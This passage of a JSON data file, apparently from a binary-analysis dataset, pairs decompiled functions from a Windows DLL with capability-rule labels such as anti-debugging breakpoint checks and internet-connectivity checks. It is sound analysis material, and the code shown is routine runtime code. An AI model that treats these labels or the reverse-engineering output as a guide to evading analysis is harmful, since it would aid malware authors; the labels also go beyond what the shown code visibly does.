0x3a8) = *(iStack56 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        return iVar7;\n    }\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        iStack48 = 0x1800cc2a7;\n        puVar3 = fcn.1800ba53c(arg1);\n        *puVar3 = 0x16;\n        iStack48 = 0x1800cc2b2;\n        fcn.1800b3508();\n        return 0x7fffffff;\n    }\ncode_r0x0001800cc256:\n    do {\n        uVar1 = *arg1;\n        arg1 = arg1 + 1;\n        uVar2 = *arg2;\n        arg2 = arg2 + 1;\n        uVar8 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar8 = uVar1;\n        }\n        uVar4 = uVar2 + 0x20;\n        if (0x19 < uVar2 - 0x41) {\n            uVar4 = uVar2;\n        }\n    } while ((uVar8 - uVar4 == 0) && (uVar8 != 0));\n    return uVar8 - uVar4;\n}\n",
        "token_count": 1561
    },
    "1800d47d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * fcn.1800d47d0(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.1800ba53c(arg1);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n    }\n    else if (arg1 < arg2) {\n        fcn.1800b1864(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 325
    },
    "1800d6a1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800d63e8)\n\nint64_t fcn.1800d6a1c(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *(arg1 + 8);\n    if (iVar3 != 0) {\n        LOCK();\n        piVar1 = iVar3 + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1) {\n            (**0x1800de8f0)(iVar3);\n            LOCK();\n            piVar1 = iVar3 + 0xc;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 == 1) {\n                (**0x1800de8f0)(iVar3);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 220
    },
    "18001fd1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001fd10(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uchar auVar5 [12];\n    ulong *puVar6;\n    ulong arg1;\n    int64_t *piVar7;\n    uint *puVar8;\n    uint32_t **ppuVar9;\n    uint32_t *puVar10;\n    int64_t iVar11;\n    ulong noname_1;\n    char *noname_1_00;\n    uint64_t noname_1_01;\n    uchar *puVar12;\n    uint32_t *puVar13;\n    uchar *puVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uchar *puVar17;\n    uint64_t uVar18;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar auVar19 [16];\n    uchar auStack280 [32];\n    uint64_t uStack248;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uchar auStack216 [16];\n    uchar uStack200;\n    uchar uStack199;\n    ushort uStack198;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint64_t uStack184;\n    uint64_t uStack176;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    ulong uStack152;\n    uint64_t uStack144;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    uchar auStack120 [16];\n    uint32_t uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    ulong uStack88;\n    uint64_t uStack80;\n    ulong uStack72;\n    ushort uStack64;\n    unkbyte6 Stack62;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack280;\n    uStack48 = *0x180101900;\n    uStack44 = *0x180101904;\n    uStack40 = *0x180101908;\n    uStack36 = *0x18010190c;\n    uStack64 = 0;\n    fcn.180010d70(&uStack64, 0x1800f4b18, 9);\n    (**0x1800de778)(*0x180124678, 0x1800f4b30);\n    puVar6 = fcn.180068040(&uStack168, 0x1800f4b40);\n    if (7 < puVar6[3]) {\n        puVar6 = *puVar6;\n    }\n    (**0x1800de788)(*0x180124678, 0x2ee1, puVar6);\n    if (uStack144 < 8) {\ncode_r0x00018001fdf2:\n        noname_1 = 0x1800f4b60;\n        arg1 = fcn.180068040(&uStack168, 0x1800f4b60);\n        piVar7 = fcn.180014b80(arg1, noname_1, L\"Version: \", 9);\n        uVar2 = *piVar7;\n        uStack228 = *(piVar7 + 4);\n        puVar17 = *piVar7;\n        uStack224 = *(piVar7 + 1);\n        uStack220 = *(piVar7 + 0xc);\n        uStack232._0_1_ = uVar2;\n        uStack232._1_1_ = uVar2 >> 8;\n        uStack232._2_2_ = uVar2 >> 0x10;\n        auVar5 = **(piVar7 + 2);\n        auStack216 = *(piVar7 + 2);\n        piVar7[2] = 0;\n        piVar7[3] = 7;\n        *piVar7 = 0;\n        puVar15 = CONCAT62(Stack62, uStack64);\n        uVar18 = CONCAT44(uStack36, uStack40);\n        puVar16 = &uStack64;\n        if (7 < uVar18) {\n            puVar16 = puVar15;\n        }\n        auStack216._0_8_ = SUB128(auVar5, 0);\n        auStack216._8_8_ = SUB168(auStack216 >> 0x40, 0);\n        uVar4 = CONCAT44(uStack44, uStack48);\n        if (auStack216._8_8_ - auStack216._0_8_ < uVar4) {\n            uStack248 = uVar4;\n            puVar8 = fcn.180013690(&uStack232, uVar4, 0, puVar16);\n            uVar18 = CONCAT44(uStack36, uStack40);\n            puVar15 = CONCAT62(Stack62, uStack64);\n        }\n        else {\n            auStack216 = CONCAT88(auStack216._8_8_, auStack216._0_8_ + uVar4);\n            puVar12 = &uStack232;\n            if (7 < auStack216._8_8_) {\n                puVar12 = puVar17;\n            }\n            fcn.1800ade80(puVar12 + auStack216._0_8_ * 2, puVar16, uVar4 * 2);\n            *(puVar12 + (auStack216._0_8_ + uVar4) * 2) = 0;\n            puVar8 = &uStack232;\n        }\n        uVar2 = *puVar8;\n        uStack200 = uVar2;\n        uStack199 = uVar2 >> 8;\n        uStack198 = uVar2 >> 0x10;\n        uStack196 = puVar8[1];\n        uStack192 = puVar8[2];\n        uStack188 = puVar8[3];\n        uStack184 = *(puVar8 + 4);\n        uStack176 = *(puVar8 + 6);\n        *(puVar8 + 4) = 0;\n        *(puVar8 + 6) = 7;\n        *puVar8 = 0;\n        puVar17 = &uStack200;\n        if (7 < uStack176) {\n            puVar17 = CONCAT44(uStack196, CONCAT22(uStack198, CONCAT11(uStack199, uStack200)));\n        }\n        (**0x1800de788)(*0x180124678, 0x2ee2, puVar17);\n        if (7 < uStack176) {\n            iVar3 = CONCAT44(uStack196, CONCAT22(uStack198, CONCAT11(uStack199, uStack200)));\n            iVar11 = iVar3;\n            if ((uStack176 * 2 + 2 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018001ff37;\n            }\n            goto code_r0x000180020438;\n        }\ncode_r0x00018001ff37:\n        uStack184 = CONCAT44(*0x180101904, *0x180101900);\n        uStack176 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack200 = 0;\n        uStack199 = 0;\n        if (7 < auStack216._8_8_) {\n            iVar3 = CONCAT44(uStack228, CONCAT22(uStack232._2_2_, CONCAT11(uStack232._1_1_, uStack232)));\n            iVar11 = iVar3;\n            if ((auStack216._8_8_ * 2 + 2 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018001ff8a;\n            }\n            goto code_r0x00018002043e;\n        }\ncode_r0x00018001ff8a:\n        auStack216 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack232._0_1_ = 0;\n        uStack232._1_1_ = 0;\n        if (7 < uStack144) {\n            iVar3 = CONCAT71(Stack167, uStack168);\n            iVar11 = iVar3;\n            if ((uStack144 * 2 + 2 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018001ffdd;\n            }\n            goto code_r0x000180020444;\n        }\ncode_r0x00018001ffdd:\n        uStack184 = CONCAT44(*0x180101914, *0x180101910);\n        uStack176 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack200 = 0;\n        fcn.180011120(&uStack200, \"10:57:26\", 8);\n        uStack152 = CONCAT44(*0x180101914, *0x180101910);\n        uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack168 = 0;\n        noname_1_00 = \"Oct 24 2022\";\n        fcn.180011120(&uStack168, \"Oct 24 2022\", 0xb);\n        ppuVar9 = fcn.180020820(&uStack168, noname_1_00, \"Build time: \", 0xc);\n        uStack136._0_4_ = *ppuVar9;\n        uStack136._4_4_ = *(ppuVar9 + 4);\n        puVar10 = *ppuVar9;\n        uStack128 = *(ppuVar9 + 1);\n        uStack124 = *(ppuVar9 + 0xc);\n        auVar5 = **(ppuVar9 + 2);\n        auStack120 = *(ppuVar9 + 2);\n        ppuVar9[2] = NULL;\n        ppuVar9[3] = 0xf;\n        *ppuVar9 = 0;\n        auStack120._0_8_ = SUB128(auVar5, 0);\n        auStack120._8_8_ = SUB168(auStack120 >> 0x40, 0);\n        if (auStack120._8_8_ - auStack120._0_8_ < 3) {\n            uStack248 = 3;\n            piVar7 = fcn.180014270(&uStack136, 3, 0, 0x1800f4aa4);\n            auVar19 = extraout_XMM0_00;\n        }\n        else {\n            auStack120 = CONCAT88(auStack120._8_8_, auStack120._0_8_ + 3);\n            puVar13 = &uStack136;\n            if (0xf < auStack120._8_8_) {\n                puVar13 = puVar10;\n            }\n            fcn.1800ade80(puVar13 + auStack120._0_8_, 0x1800f4aa4, 3);\n            *(puVar13 + auStack120._0_8_ + 3) = 0;\n            piVar7 = &uStack136;\n            auVar19 = extraout_XMM0;\n        }\n        uVar4 = uStack184;\n        auStack216 = auVar19 & 0x0;\n        uVar2 = *piVar7;\n        puVar12 = *piVar7;\n        puVar17 = *piVar7;\n        uStack232._0_1_ = uVar2;\n        uStack232._1_1_ = uVar2 >> 8;\n        uStack232._2_2_ = uVar2 >> 0x10;\n        uStack228 = *(piVar7 + 4);\n        uStack224 = *(piVar7 + 1);\n        uStack220 = *(piVar7 + 0xc);\n        auVar5 = **(piVar7 + 2);\n        auStack216 = *(piVar7 + 2);\n        piVar7[2] = 0;\n        piVar7[3] = 0xf;\n        *piVar7 = 0;\n        auStack216._8_8_ = SUB168(auStack216 >> 0x40, 0);\n        auStack216._0_8_ = SUB128(auVar5, 0);\n        noname_1_01 = auStack216._8_8_ - auStack216._0_8_;\n        if ((noname_1_01 < uStack184) && (auStack216._0_8_ <= uStack176 - uStack184)) {\n            puVar12 = &uStack232;\n            if (0xf < auStack216._8_8_) {\n                puVar12 = puVar17;\n            }\n            puVar10 = fcn.180020820(&uStack200, noname_1_01, puVar12, auStack216._0_8_);\n        }\n        else {\n            puVar17 = &uStack200;\n            if (0xf < uStack176) {\n                puVar17 = CONCAT44(uStack196, CONCAT22(uStack198, CONCAT11(uStack199, uStack200)));\n            }\n            if (noname_1_01 < uStack184) {\n                uStack248 = uStack184;\n                puVar10 = fcn.180014270(&uStack232, uStack184, 0, puVar17);\n            }\n            else {\n                auStack216 = CONCAT88(auStack216._8_8_, auStack216._0_8_ + uStack184);\n                puVar14 = &uStack232;\n                if (0xf < auStack216._8_8_) {\n                    puVar14 = puVar12;\n                }\n                fcn.1800ade80(puVar14 + auStack216._0_8_, puVar17, uStack184);\n                (puVar14 + auStack216._0_8_)[uVar4] = 0;\n                puVar10 = &uStack232;\n            }\n        }\n        uStack104 = *puVar10;\n        uStack100 = puVar10[1];\n        uStack96 = puVar10[2];\n        uStack92 = puVar10[3];\n        uStack88 = *(puVar10 + 4);\n        uStack80 = *(puVar10 + 6);\n        *puVar10 = 0;\n        *(puVar10 + 6) = 0xf;\n        *(puVar10 + 4) = 0;\n        puVar10 = &uStack104;\n        if (0xf < uStack80) {\n            puVar10 = CONCAT44(uStack100, uStack104);\n        }\n        (**0x1800de790)(*0x180124678, 0x2ee5, puVar10);\n        if (0xf < uStack80) {\n            iVar3 = CONCAT44(uStack100, uStack104);\n            iVar11 = iVar3;\n            if ((uStack80 + 1 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x000180020211;\n            }\n            goto code_r0x00018002044a;\n        }\ncode_r0x000180020211:\n        uStack88 = CONCAT44(*0x180101914, *0x180101910);\n        uStack80 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack104 = uStack104 & 0xffffff00;\n        if (0xf < auStack216._8_8_) {\n            iVar3 = CONCAT44(uStack228, CONCAT22(uStack232._2_2_, CONCAT11(uStack232._1_1_, uStack232)));\n            iVar11 = iVar3;\n            if ((auStack216._8_8_ + 1 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018002025e;\n            }\n            goto code_r0x000180020450;\n        }\ncode_r0x00018002025e:\n        auStack216 = CONCAT88(CONCAT44(*0x18010191c, *0x180101918), CONCAT44(*0x180101914, *0x180101910));\n        uStack232._0_1_ = 0;\n        if (0xf < auStack120._8_8_) {\n            iVar3 = CONCAT44(uStack136._4_4_, uStack136);\n            iVar11 = iVar3;\n            if ((auStack120._8_8_ + 1 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x0001800202ab;\n            }\n            goto code_r0x000180020456;\n        }\ncode_r0x0001800202ab:\n        auStack120 = CONCAT88(CONCAT44(*0x18010191c, *0x180101918), CONCAT44(*0x180101914, *0x180101910));\n        uStack136._0_4_ = uStack136 & 0xffffff00;\n        if (uStack144 < 0x10) {\ncode_r0x0001800202f7:\n            uStack152 = CONCAT44(*0x180101914, *0x180101910);\n            uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack168 = 0;\n            if (0xf < uStack176) {\n                iVar3 = CONCAT44(uStack196, CONCAT22(uStack198, CONCAT11(uStack199, uStack200)));\n                iVar11 = iVar3;\n                if ((0xfff < uStack176 + 1) && (iVar11 = *(iVar3 + -8),  0x1f < (iVar3 - iVar11) - 8U))\n                goto code_r0x000180020462;\n                fcn.18008fb24(iVar11);\n            }\n            puVar6 = fcn.180068040(&uStack168, 0x1800f4bc0);\n            if (7 < puVar6[3]) {\n                puVar6 = *puVar6;\n            }\n            (**0x1800de788)(*0x180124678, 0x2ee3, puVar6);\n            if (7 < uStack144) {\n                iVar3 = CONCAT71(Stack167, uStack168);\n                iVar11 = iVar3;\n                if (0xfff < uStack144 * 2 + 2) {\n                    iVar11 = *(iVar3 + -8);\n                    if (0x1f < (iVar3 - iVar11) - 8U) {\n                        fcn.1800b3528(iVar11, uStack144 * 2 + 0x29);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar11);\n            }\n            (**0x1800de788)(*0x180124678, 1, 0x1800f4be0);\n            if (uVar18 < 8) goto code_r0x000180020403;\n            puVar16 = puVar15;\n            if (0xfff < uVar18 * 2 + 2) {\n                puVar16 = *(puVar15 + -4);\n                if (0x1f < puVar15 + (-8 - puVar16)) {\n                    fcn.1800b3528();\n                    goto code_r0x000180020432;\n                }\n            }\n            fcn.18008fb24(puVar16);\ncode_r0x000180020403:\n            fcn.18008fb00(uStack32 ^ auStack280);\n            return;\n        }\n        iVar3 = CONCAT71(Stack167, uStack168);\n        iVar11 = iVar3;\n        if ((uStack144 + 1 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x0001800202f7;\n        }\n    }\n    else {\n        iVar3 = CONCAT71(Stack167, uStack168);\n        iVar11 = iVar3;\n        if ((uStack144 * 2 + 2 < 0x1000) || (iVar11 = *(iVar3 + -8),  (iVar3 - iVar11) - 8U < 0x20)) {\n            fcn.18008fb24(iVar11);\n            goto code_r0x00018001fdf2;\n        }\ncode_r0x000180020432:\n        fcn.1800b3528();\ncode_r0x000180020438:\n        fcn.1800b3528();\ncode_r0x00018002043e:\n        fcn.1800b3528();\ncode_r0x000180020444:\n        fcn.1800b3528();\ncode_r0x00018002044a:\n        fcn.1800b3528();\ncode_r0x000180020450:\n        fcn.1800b3528();\ncode_r0x000180020456:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180020462:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 5031
    },
    "18002788": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.180027880(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    ulong *puVar7;\n    uint32_t uVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack216 [32];\n    uint32_t uStack184;\n    ulong uStack176;\n    ulong uStack160;\n    uint64_t uStack152;\n    ushort uStack144;\n    unkbyte6 Stack142;\n    ulong uStack128;\n    uint64_t uStack120;\n    ulong uStack112;\n    uint uStack104;\n    uchar auStack100 [3];\n    ulong var_59h;\n    ulong var_51h;\n    uchar auStack80 [7];\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    \n    uStack112 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack216;\n    uVar8 = 0;\n    uStack184 = 0;\n    *(arg1 + 0x60) = 1;\n    (**0x1800de788)(*(arg1 + 0x18), 0x2392);\n    piVar6 = arg2 + 0x40;\n    if (7 < *(arg2 + 0x58)) {\n        piVar6 = *piVar6;\n    }\n    (**0x1800de778)(*(arg1 + 0x78), piVar6);\n    (**0x1800de758)(*(arg1 + 0x18));\n    iVar12 = 0;\n    puVar9 = arg1 + 0xa0;\n    puVar10 = arg2 + 0x90;\n    puVar11 = arg2 + 0x80;\n    while( true ) {\n        if (*puVar11 == 0) {\n            uStack160 = 0;\n            uStack152 = 7;\n            uStack176._0_2_ = 0;\n            fcn.180010d70(&uStack176, 0x1800f6144, 0);\n            puVar4 = &uStack176;\n            uVar8 = uVar8 | 1;\n        }\n        else {\n            puVar4 = fcn.180020b50(&uStack144, *puVar11);\n            uVar8 = uVar8 | 2;\n        }\n        stack0xffffffffffffffa8 = 0;\n        _auStack80 = 0;\n        uStack104 = *puVar4;\n        _auStack100 = puVar4[1];\n        var_59h._1_4_ = puVar4[2];\n        stack0xffffffffffffffa4 = puVar4[3];\n        unique0x10000313 = *(puVar4 + 4);\n        _auStack80 = *(puVar4 + 6);\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 6) = 7;\n        *puVar4 = 0;\n        uStack184 = uVar8;\n        if ((uVar8 & 2) != 0) break;\ncode_r0x0001800279f8:\n        if (((uVar8 & 1) != 0) && (uVar8 = uVar8 & 0xfffffffe,  uStack184 = uVar8,  7 < uStack152)) {\n            iVar3 = CONCAT62(uStack176._2_6_, uStack176);\n            iVar5 = iVar3;\n            if ((0xfff < uStack152 * 2 + 2) && (iVar5 = *(iVar3 + -8),  0x1f < (iVar3 - iVar5) - 8U))\n            goto code_r0x000180027b56;\n            fcn.18008fb24(iVar5);\n        }\n        puVar4 = &uStack104;\n        if (7 < _auStack80) {\n            puVar4 = CONCAT44(_auStack100, uStack104);\n        }\n        (**0x1800de778)(puVar9[-3], puVar4);\n        puVar7 = puVar10;\n        if (7 < puVar10[3]) {\n            puVar7 = *puVar10;\n        }\n        (**0x1800de778)(*puVar9, puVar7);\n        if (7 < _auStack80) {\n            iVar3 = CONCAT44(_auStack100, uStack104);\n            iVar5 = iVar3;\n            if ((0xfff < _auStack80 * 2 + 2) && (iVar5 = *(iVar3 + -8),  0x1f < (iVar3 - iVar5) - 8U)) {\n                fcn.1800b3528();\n                goto code_r0x000180027b50;\n            }\n            fcn.18008fb24(iVar5);\n        }\n        iVar12 = iVar12 + 1;\n        puVar11 = puVar11 + 1;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 4;\n        if (2 < iVar12) {\n            piVar6 = arg2 + 0x20;\n            if (7 < *(arg2 + 0x38)) {\n                piVar6 = *piVar6;\n            }\n            iVar12 = (**0x1800de7f0)(*(arg1 + 0x80), 0x14c, 0xffffffffffffffff, piVar6);\n            uVar1 = *(arg1 + 0x80);\n            (**0x1800de7f0)(uVar1, 0x14e, iVar12, 0);\n            (**0x1800de5b8)(uVar1, 0, 0);\n            *(arg1 + 0x60) = 0;\n            fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack216);\n            return;\n        }\n    }\n    uVar8 = uVar8 & 0xfffffffd;\n    uStack184 = uVar8;\n    if (uStack120 < 8) {\ncode_r0x0001800279e8:\n        uStack128 = 0;\n        uStack120 = 7;\n        uStack144 = 0;\n        goto code_r0x0001800279f8;\n    }\n    iVar3 = CONCAT62(Stack142, uStack144);\n    iVar5 = iVar3;\n    if ((uStack120 * 2 + 2 < 0x1000) || (iVar5 = *(iVar3 + -8),  (iVar3 - iVar5) - 8U < 0x20)) {\n        fcn.18008fb24(iVar5);\n        goto code_r0x0001800279e8;\n    }\ncode_r0x000180027b50:\n    fcn.1800b3528();\ncode_r0x000180027b56:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1730
    },
    "18002d86": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint64_t * fcn.18002d860(int64_t arg1, int64_t *arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    uint64_t *puVar2;\n    int64_t iVar3;\n    ulong *arg1_00;\n    uint64_t uVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    uint64_t arg1_01;\n    ulong *arg2_00;\n    uint64_t uVar12;\n    uint64_t *puVar13;\n    ulong *puVar14;\n    int64_t arg2_01;\n    uint64_t *puVar15;\n    ulong *puVar16;\n    int64_t iStack104;\n    \n    iVar10 = *(arg1 + 8);\n    arg2_01 = arg3 + 0xf0;\n    if (arg2_01 != iVar10) {\n        puVar16 = arg3 + 0x168;\n        puVar14 = arg3 + 0x78;\n        iStack104 = arg3;\n        do {\n            fcn.18000d960(iStack104, arg2_01);\n            fcn.18000d960(puVar14 + -0xb, puVar16 + -0xb);\n            arg2_00 = puVar16 + -7;\n            fcn.18000d960(puVar14 + -7, arg2_00);\n            arg1_00 = puVar14 + -2;\n            puVar1 = puVar16 + -2;\n            *(puVar14 + -3) = *(puVar16 + -3);\n            if (arg1_00 != puVar1) {\n                fcn.18002df90(arg1_00, arg2_00);\n                *arg1_00 = *puVar1;\n                puVar14[-1] = puVar16[-1];\n                *puVar14 = *puVar16;\n                *puVar1 = 0;\n                puVar16[-1] = 0;\n                *puVar16 = 0;\n            }\n            uVar12 = 0;\n            puVar13 = puVar14 + 6;\n            *(puVar14 + 1) = *(puVar16 + 1);\n            *(puVar14 + 0xc) = *(puVar16 + 0xc);\n            *(puVar14 + 2) = *(puVar16 + 2);\n            iVar9 = arg2_01 - iStack104;\n            do {\n                puVar15 = puVar13 + iVar9 + -0x18;\n                puVar2 = puVar13 + -3;\n                if (puVar2 != puVar15) {\n                    if (7 < *puVar13) {\n                        uVar4 = *puVar2;\n                        iVar3 = *puVar13 * 2;\n                        arg1_01 = uVar4;\n                        if (0xfff < iVar3 + 2U) {\n                            arg1_01 = *(uVar4 - 8);\n                            if (0x1f < (uVar4 - arg1_01) - 8) {\n                                fcn.1800b3528(uVar4 - arg1_01, iVar3 + 0x29);\n                                pcVar5 = swi(3);\n                                piVar11 = (*pcVar5)();\n                                return piVar11;\n                            }\n                        }\n                        fcn.18008fb24(arg1_01);\n                    }\n                    puVar13[-1] = 0;\n                    *puVar13 = 7;\n                    *puVar2 = 0;\n                    uVar6 = *(puVar15 + 4);\n                    uVar7 = *(puVar15 + 1);\n                    uVar8 = *(puVar15 + 0xc);\n                    *puVar2 = *puVar15;\n                    *(puVar13 + -0x14) = uVar6;\n                    *(puVar13 + -2) = uVar7;\n                    *(puVar13 + -0xc) = uVar8;\n                    uVar6 = *(puVar15 + 0x14);\n                    uVar7 = *(puVar15 + 3);\n                    uVar8 = *(puVar15 + 0x1c);\n                    *(puVar13 + -1) = *(puVar15 + 2);\n                    *(puVar13 + -4) = uVar6;\n                    *puVar13 = uVar7;\n                    *(puVar13 + 4) = uVar8;\n                    *(iVar9 + -8 + puVar13) = 0;\n                    *(iVar9 + puVar13) = 7;\n                    *puVar15 = 0;\n                }\n                uVar12 = uVar12 + 1;\n                puVar13 = puVar13 + 4;\n            } while (uVar12 < 3);\n            puVar14 = puVar14 + 0x1e;\n            iStack104 = iStack104 + 0xf0;\n            arg2_01 = arg2_01 + 0xf0;\n            puVar16 = puVar16 + 0x1e;\n        } while (arg2_01 != iVar10);\n        iVar10 = *(arg1 + 8);\n    }\n    fcn.180025000(iVar10 + -0xf0);\n    *(arg1 + 8) = *(arg1 + 8) + -0xf0;\n    *arg2 = arg3;\n    return arg2;\n}\n",
        "token_count": 1221
    },
    "18003ba5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.18003ba50(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = (*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 + -1;\n    uVar1 = iVar2 * 0x66666667 & 0xffffffff;\n    uVar3 = iVar2 / 10 + 1;\n    if (uVar3 < 3) {\n        fcn.18003b930(arg1);\n        fcn.18003bf80(arg1 + 0xb8, (*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 + 10);\n        uVar1 = fcn.18003b5c0(arg1, uVar3);\n    }\n    return uVar1;\n}\n",
        "token_count": 203
    },
    "18006534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nchar * fcn.180065340(int64_t arg1, uint32_t *arg2)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    \n    if (((arg1 != 0) && (2 < *arg2)) && (pcVar4 = (**0x1800de418)(0x40),  pcVar4 != NULL)) {\n        uVar6 = *arg2;\n        uVar7 = 0;\n        pcVar5 = pcVar4;\n        if (uVar6 != 2) {\n            do {\n                iVar2 = uVar7;\n                *pcVar5 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[*(uVar7 + arg1) >> 2];\n                puVar1 = uVar7 + arg1;\n                uVar7 = iVar2 + 3U;\n                pcVar5[1] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                            [(*puVar1 & 3) << 4 | *(iVar2 + 1U + arg1) >> 4];\n                pcVar5[2] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                            